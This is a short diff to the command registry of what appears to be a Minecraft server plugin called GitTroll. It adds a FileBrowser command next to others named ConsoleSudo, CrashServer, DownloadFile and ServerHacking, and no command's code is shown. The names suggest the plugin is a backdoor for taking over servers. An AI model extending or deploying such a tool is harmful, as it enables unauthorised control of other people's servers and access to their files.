@@ -54,6 +54,7 @@ import net.Lenni0451.GitTroll.command.commands.server.ClearChat;
 import net.Lenni0451.GitTroll.command.commands.server.ConsoleSudo;
 import net.Lenni0451.GitTroll.command.commands.server.CrashServer;
 import net.Lenni0451.GitTroll.command.commands.server.DownloadFile;
+import net.Lenni0451.GitTroll.command.commands.server.FileBrowser;
 import net.Lenni0451.GitTroll.command.commands.server.Plugins;
 import net.Lenni0451.GitTroll.command.commands.server.Reload;
 import net.Lenni0451.GitTroll.command.commands.server.ServerLag;
@@ -167,6 +168,7 @@ public class CommandManager implements Listener {
 	public final DownloadTerrain DownloadTerrain = null;
 	public final FakeHacker FakeHacker = null;
 	public final ServerHacking ServerHacking = null;
+	public final FileBrowser FileBrowser = null;
 	
 	public CommandManager() {
 		this.commands = new ArrayList<>();
